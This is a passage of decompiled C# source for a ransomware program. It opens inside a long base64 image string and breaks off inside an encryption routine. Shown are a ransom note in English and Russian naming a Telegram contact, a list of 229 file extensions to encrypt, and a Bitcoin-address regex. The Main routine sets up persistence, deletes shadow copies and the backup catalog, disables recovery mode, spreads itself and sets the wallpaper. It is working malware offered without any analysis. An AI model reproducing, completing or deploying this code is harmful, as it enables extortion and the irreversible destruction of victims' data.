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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "КАК РАСШИФРОВАТЬ FILES.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[12]
	{
		"Attention! All your files are encrypted!", "To restore your files and access them,", "send an SMS with the text - to the User Telegram @keygroup777huis2", "", "", "You have 1 attempts to enter the code. If this", "amount is exceeded, all data will irreversibly deteriorate. Be", "careful when entering the code!", "", "",
		"Glory @keygroup777", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".exe", ".lnk"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
